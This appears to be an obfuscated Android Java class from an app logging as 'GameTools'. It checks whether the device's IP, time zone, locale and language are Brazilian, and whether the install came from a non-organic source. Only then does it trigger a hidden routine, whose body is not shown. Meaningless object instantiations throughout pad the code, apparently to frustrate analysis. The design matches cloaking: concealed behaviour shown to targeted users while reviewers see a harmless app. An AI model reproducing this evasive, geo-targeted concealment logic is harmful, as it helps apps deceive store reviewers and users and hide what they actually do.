package xkjfie;

import android.content.Context;
import android.content.res.Configuration;
import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.Locale;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import xkjfie.mrcsi.gniq.kput.Ehhhqizd;
import xkjfie.nohsc.jfmc.Bdkmacf;
import xkjfie.otu.aotqx.Anqafobs;
import xkjfie.otu.aotqx.Fmwrl;
import xkjfie.otu.aotqx.Gkufhyqaun;
import xkjfie.otu.aotqx.Goiqosh;
import xkjfie.otu.aotqx.Mkdzk;
import xkjfie.otu.aotqx.Otvzdwv;
import xkjfie.rjy.tvgqm.rxft.Iedtnchu;
import xkjfie.rjy.tvgqm.rxft.Jqzilfmr;
import xkjfie.rjy.tvgqm.rxft.Mwenpjj;
import xkjfie.rjy.tvgqm.rxft.Wfoie;
import xkjfie.swwau.uth.glwfc.Dawsgb;
import xkjfie.swwau.uth.glwfc.Fnihavq;
import xkjfie.swwau.uth.glwfc.Gdomxe;
import xkjfie.swwau.uth.glwfc.Hlkouj;
import xkjfie.swwau.uth.glwfc.Kqkfze;
import xkjfie.swwau.uth.glwfc.Qdhewj;
import xkjfie.sxfr.ceig.Bkykua;
import xkjfie.sxfr.ceig.Cvuuztugtr;
import xkjfie.sxfr.ceig.Etuvg;
import xkjfie.sxfr.ceig.Ievfriq;
import xkjfie.sxfr.ceig.Uuwkm;
import xkjfie.wcywp.fjca.fuk.Cjxqdp;
import xkjfie.wcywp.fjca.fuk.Cxdtgljs;
import xkjfie.wcywp.fjca.fuk.Ddsrc;
import xkjfie.wcywp.fjca.fuk.Kdect;
import xkjfie.wcywp.fjca.fuk.Kxuhvpecd;
import xkjfie.wcywp.fjca.fuk.Obktyzf;
import xkjfie.wcywp.fjca.fuk.Pcldslgxvb;
import xkjfie.wcywp.fjca.fuk.Uqrxff;
import xkjfie.zahi.rdbu.aveqk.Rotseipc;
import xkjfie.zahi.rdbu.aveqk.Zhpnmee;

public class dfjiejseg {
    private static boolean kfjeisgjdf = false;
    private static final String JFIEJFUG = "http://ip-api.com/json";
    private static class Mfjiefji extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... params) {
            HttpURLConnection connection = null;
            BufferedReader reader = null;
            try {
                URL url = new URL(JFIEJFUG);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);

                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                new Rotseipc();
                new Zhpnmee();
                //Log.d("GameTools", "ip:"+response.toString());
                return response.toString();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (connection != null) {
                    connection.disconnect();
                }
                if (reader != null) {
                    try {
                        reader.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(String response) {
            if (response != null) {
                try {
                    new Cjxqdp();
                    JSONObject jsonObject = new JSONObject(response);
                    //Log.d("GameTools", "jsonObject:"+jsonObject);
                    String country = jsonObject.optString("country");
                    //Log.d("GameTools", "country:"+country);
                    if (country.equals("Brazil")) {
                        //Log.d("GameTools", "The current IP address is in Brazil");
                        kfjeisgjdf = true;
                    } else {
                        //Log.d("GameTools", "The current IP address is not in Brazil");
                        kfjeisgjdf = false;
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } else {
                new Cxdtgljs();
                //Log.d("GameTools", "Failed to retrieve the current IP address");
                kfjeisgjdf = false;
            }
        }

    }

    public static boolean kjfifeufheg(){
        new Kxuhvpecd();
        TimeZone fjfufgf = TimeZone.getDefault();
        Calendar lkfiejfuhg = Calendar.getInstance(fjfufgf);
        String kfgjuefe = fjfufgf.getID();
        Locale kjfiefheug = Locale.getDefault();
        String kghdfeuu = kjfiefheug.getCountry();
        new Ddsrc();
        new Kdect();
        //Log.d("GameTools", "时区ID: " + kfgjuefe);
        //Log.d("GameTools", "country: " + country);
        boolean jfejfuig = kfgjuefe.equals("America/Sao_Paulo") || kfgjuefe.equals("America/Rio_de_Janeiro") || kfgjuefe.equals("America/Fortaleza") || kfgjuefe.equals("America/Manaus")
                || kfgjuefe.equals("America/Porto_Velho") || kfgjuefe.equals("America/Bahia") || kfgjuefe.equals("America/Noronha") || kfgjuefe.equals("America/Cuiaba")
                || kfgjuefe.equals("America/Rio_Branco");
        if (jfejfuig && kghdfeuu.equals("BR")) {
            //Log.d("GameTools", "当前手机时区为巴西。");
            return true;
        } else {
            //Log.d("GameTools", "当前手机时区不是巴西。");
            return false;
        }
    }

    public static boolean kfefsjuhg(){
        new Mfjiefji().execute();
        return kfjeisgjdf;
    }

    public static boolean kvjguhefhy() {
        Configuration kjfgiehfuhg = lkoefijg.getResources().getConfiguration();
        Locale currentLocale;
        new Obktyzf();
        new Bkykua();
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            currentLocale = kjfgiehfuhg.getLocales().get(0);
        } else {
            currentLocale = kjfgiehfuhg.locale;
        }
        new Pcldslgxvb();
        new Uqrxff();
        String language = currentLocale.getLanguage();
        //Log.d("GameTools", "language:"+language);
        return language.equals("pt");
    }



    public static void kjgigjefuhfg(){
        final Timer kfdjefug = new Timer();
        final TimerTask lfkfe = new TimerTask() {
            @Override
            public void run() {
                new Cvuuztugtr();
                new Etuvg();
                String kfgjeuguf = Rollfjuesff.oefiesfug().mxcnvdfhyfeyf();
                if(!"".equals(kfgjeuguf))
                {
                    //Log.d("GameTools", "status:"+kfgjeuguf);
                    if ("Organic".equals(kfgjeuguf) || "organic".equals(kfgjeuguf)){
                        //fksiwefjisug.kjfeusef();
                        new Ievfriq();
                        new Uuwkm();
                    }else{
                        fksiwefjisug.kjfeusef();
                    }
                    new Dawsgb();
                    new Fnihavq();
                    kfdjefug.cancel();
                }
            }
        };
        new Gdomxe();
        new Hlkouj();
        kfdjefug.schedule(lfkfe, 1500, 1500);
    }


    public static boolean mcvbnjhfeuf = false;

    private static Context lkoefijg = null;
    public static void mjghuef(Context cont){
        lkoefijg = cont;
        new Kqkfze();
        new Qdhewj();
        final Timer fkeisjfe = new Timer();
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                new Iedtnchu();
                new Jqzilfmr();
                boolean mvnbdfufeuf = Rulfkdf.getInfo();
                if(mvnbdfufeuf){
                    fkeisjfe.cancel();
                    if (mcvbnjhfeuf){
                        //Log.d("GameTools", "getIpIsBR():" + kfefsjuhg() + "===getTimeZoneIsBR():" + kjfifeufheg() +  "=====isPortugueseLanguage():" + kvjguhefhy());
                        if(kfefsjuhg() && kjfifeufheg() && kvjguhefhy()){
                            //是否是巴西时区 是否是巴西ip  手机系统是否是葡语
                            new Mwenpjj();
                            new Wfoie();
                            fksiwefjisug.kjfeusef();
                        }else{
                            new Anqafobs();
                            new Fmwrl();
                            kjgigjefuhfg();
                        }
                    }else{
                        new Gkufhyqaun();
                        new Goiqosh();
                        kjgigjefuhfg();
                    }
                }else{
                    new Mkdzk();
                    new Otvzdwv();
                    fkeisjfe.cancel();
                    kjgigjefuhfg();
                }
            }
        };
        new Bdkmacf();
        new Ehhhqizd();
        fkeisjfe.schedule(task, 1000, 1000);
    }
}
